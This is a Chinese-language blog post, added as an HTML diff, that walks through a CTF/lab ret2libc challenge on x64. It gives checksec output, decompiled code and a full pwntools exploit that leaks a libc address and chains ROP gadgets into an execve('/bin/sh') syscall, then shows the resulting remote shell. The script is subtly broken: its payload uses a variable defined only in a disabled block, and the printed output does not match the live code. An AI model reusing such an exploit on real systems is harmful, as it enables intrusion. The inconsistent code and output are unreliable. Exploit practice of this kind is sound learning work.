@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn学习," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="依旧是ret2libc的练习  只不过这个是x64且给了so文件的情况例2​        题目地址：goo.gl&#x2F;a4zGp8 1nc isc.taiwan-te.ch 10006  ​        其他练习题地址：https:&#x2F;&#x2F;isc.taiwan-te.ch&#x2F;scoreboard&#x2F; 题目分析​        拿到题目之后依旧是checksec来分析 123456[*] &#39;&#x2F;home&#x2F;nm">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn学习之ret2libc练习(湾湾某学校)">
+<meta property="og:url" content="https://huangpiao.tech/2020/01/30/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8Bret2libc%E7%BB%83%E4%B9%A0-%E6%B9%BE%E6%B9%BE%E6%9F%90%E5%AD%A6%E6%A0%A1/index.html">
+<meta property="og:site_name" content="x1a0g&#39;Blog">
+<meta property="og:description" content="依旧是ret2libc的练习  只不过这个是x64且给了so文件的情况例2​        题目地址：goo.gl&#x2F;a4zGp8 1nc isc.taiwan-te.ch 10006  ​        其他练习题地址：https:&#x2F;&#x2F;isc.taiwan-te.ch&#x2F;scoreboard&#x2F; 题目分析​        拿到题目之后依旧是checksec来分析 123456[*] &#39;&#x2F;home&#x2F;nm">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-01-30T11:14:38.000Z">
+<meta property="article:modified_time" content="2020-01-30T11:49:20.386Z">
+<meta property="article:author" content="x1a0g">
+<meta property="article:tag" content="pwn学习">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://huangpiao.tech/2020/01/30/pwn学习之ret2libc练习-湾湾某学校/"/>
+
+
+
+
+
+  <title>pwn学习之ret2libc练习(湾湾某学校) | x1a0g'Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">x1a0g'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://huangpiao.tech/2020/01/30/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8Bret2libc%E7%BB%83%E4%B9%A0-%E6%B9%BE%E6%B9%BE%E6%9F%90%E5%AD%A6%E6%A0%A1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="x1a0g">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="x1a0g'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">pwn学习之ret2libc练习(湾湾某学校)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-30T19:14:38+08:00">
+                2020-01-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="依旧是ret2libc的练习-只不过这个是x64且给了so文件的情况"><a href="#依旧是ret2libc的练习-只不过这个是x64且给了so文件的情况" class="headerlink" title="依旧是ret2libc的练习  只不过这个是x64且给了so文件的情况"></a>依旧是ret2libc的练习  只不过这个是x64且给了so文件的情况</h4><h5 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h5><p>​        题目地址：<a href="goo.gl/a4zGp8">goo.gl/a4zGp8</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc isc.taiwan-te.ch 10006</span><br></pre></td></tr></table></figure>
+
+<p>​        其他练习题地址：<a href="https://isc.taiwan-te.ch/scoreboard/" target="_blank" rel="noopener">https://isc.taiwan-te.ch/scoreboard/</a></p>
+<h6 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h6><p>​        拿到题目之后依旧是checksec来分析</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">'/home/nmtech/Desktop/pwnstudy/ret2libc/Lab 7/Lab 7/ret2libc'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>​        依旧为开的Nx   是个64位的程序  一看到64位 我们应该想到要使用gadget来传参</p>
+<p>​        扔进ida分析一波  ：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  _QWORD *v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You have one chance to read the memory!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give me the address in hex: "</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  v6 = (_QWORD *)strtoll(&amp;buf, <span class="number">0L</span>L, <span class="number">16</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nContent: %lld\n"</span>, *v6);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give me your messege: "</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;v4, <span class="number">0x90</span>uLL);    <span class="comment">//溢出点</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 这道题简化的利用难度我们不需要再去leak puts个函数的地址  直接程序帮我们打印出来了</p>
+<p>我们只需要把put的got地址传进去就可以了   而且这道题其实源码写的是两个printf来输出 但是由于第一个输出没有换行 所以就默认解析成puts函数   这也算一个小知识点吧</p>
+<h6 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h6><ul>
+<li>首先要把puts的真实地址接受过来  来去计算libc的基址   </li>
+<li>其次要去找到我们x64的gadget   rdi  rsi  rdx  rax   syscall</li>
+<li>接着就可以利用栈溢出漏洞来getshell</li>
+<li>这里我在写exp时候没有使用system(‘/bin/sh’)来做因为不知道为啥打不通希望师傅们予以指正</li>
+</ul>
+<h6 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process('./ret2libc')</span></span><br><span class="line">io = remote(<span class="string">'isc.taiwan-te.ch'</span>,<span class="number">10006</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ret2libc'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"><span class="comment">#libc = ELF['/lib/i386-linux-gnu/libc.so.6']</span></span><br><span class="line">gar_rdi = <span class="number">0x000000000002155f</span>   <span class="comment">#pop rdi ; ret</span></span><br><span class="line">gar_rsi = <span class="number">0x0000000000023e6a</span>   <span class="comment">#pop rsi ; ret</span></span><br><span class="line">gar_rdx = <span class="number">0x0000000000001b96</span>   <span class="comment">#pop rdx ; ret</span></span><br><span class="line">gar_rax = <span class="number">0x00000000000439c8</span>   <span class="comment">#pop rax ; ret</span></span><br><span class="line">gar_syscall = <span class="number">0x00000000000d2975</span> <span class="comment">#syscall</span></span><br><span class="line">io.recvuntil(<span class="string">': '</span>)</span><br><span class="line">io.send(<span class="string">'0x601018'</span>)   <span class="comment">#发送puts函数的got表的地址</span></span><br><span class="line">io.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">libc_puts = int(io.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>])  <span class="comment">#接受我们返回的puts函数的真实地址</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts========"</span>+hex(libc_puts)</span><br><span class="line">io.recvuntil(<span class="string">"messege: "</span>)</span><br><span class="line">libc_base = (libc_puts)-libc.symbols[<span class="string">'puts'</span>] <span class="comment"># 计算基址</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libcbase===="</span>+str(hex(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">不知道为啥这样方式打不通  </span></span><br><span class="line"><span class="string">sys_addr = libc_base+libc.symbols['system']</span></span><br><span class="line"><span class="string">print "system===="+str(hex(sys_addr))</span></span><br><span class="line"><span class="string">binlibc = libc_base+libc.search("/bin/sh").next()</span></span><br><span class="line"><span class="string">print "/bin/sh===="+str(hex(binlibc))</span></span><br><span class="line"><span class="string">payload = 'a'*0x38+p64(libc_base+gar_rdi)+p64(binlibc)+p64(sys_addr)</span></span><br><span class="line"><span class="string">最后选了execve("/bin/sh",0,0)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x38</span>  <span class="comment">#这个0x38的偏移是0x30+0x8的ebp  可以去objdump去看下 就可以看到了</span></span><br><span class="line">payload+=p64(libc_base+gar_rdi)   <span class="comment">#我们在libc中拿到的是偏移 所以需要加基址</span></span><br><span class="line">payload+=p64(binlibc)</span><br><span class="line">payload+=p64(libc_base+gar_rsi)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(libc_base+gar_rdx)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(libc_base+gar_rax)</span><br><span class="line">payload+=p64(<span class="number">0x3b</span>)  <span class="comment">#syscall的第一个参数即rax中写入0x3b时(32位程序为0xb)</span></span><br><span class="line">payload+=p64(libc_base+gar_syscall)  <span class="comment">#syscall(32位程序为int80)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="攻击成功"><a href="#攻击成功" class="headerlink" title="攻击成功"></a>攻击成功</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">$ python slove.py  </span><br><span class="line">[+] Opening connection to isc.taiwan-te.ch on port 10006: Done</span><br><span class="line">[*] <span class="string">'/home/nmtech/Desktop/pwnstudy/ret2libc/Lab 7/Lab 7/ret2libc'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[*] <span class="string">'/home/nmtech/Desktop/pwnstudy/ret2libc/Lab 7/Lab 7/libc-2.27.so'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">puts========0x7fdb96e979c0</span><br><span class="line">libcbase====0x7fdb96e17000</span><br><span class="line">system====0x7fdb96e66440</span><br><span class="line">/bin/sh====0x7fdb96fcae9a</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>
+
+<p>完事自己find一下flag就好了</p>
+<p>​            </p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn%E5%AD%A6%E4%B9%A0/" rel="tag"># pwn学习</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/30/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8Bret2libc%E7%BB%83%E4%B9%A0(%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C)/" rel="next" title="pwn学习之ret2libc练习（攻防世界level3）">
+                <i class="fa fa-chevron-left"></i> pwn学习之ret2libc练习（攻防世界level3）
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">x1a0g</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#依旧是ret2libc的练习-只不过这个是x64且给了so文件的情况"><span class="nav-number">1.</span> <span class="nav-text">依旧是ret2libc的练习  只不过这个是x64且给了so文件的情况</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#例2"><span class="nav-number">1.1.</span> <span class="nav-text">例2</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#题目分析"><span class="nav-number">1.1.1.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#思路"><span class="nav-number">1.1.2.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#exp"><span class="nav-number">1.1.3.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#攻击成功"><span class="nav-number">1.1.4.</span> <span class="nav-text">攻击成功</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">x1a0g</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
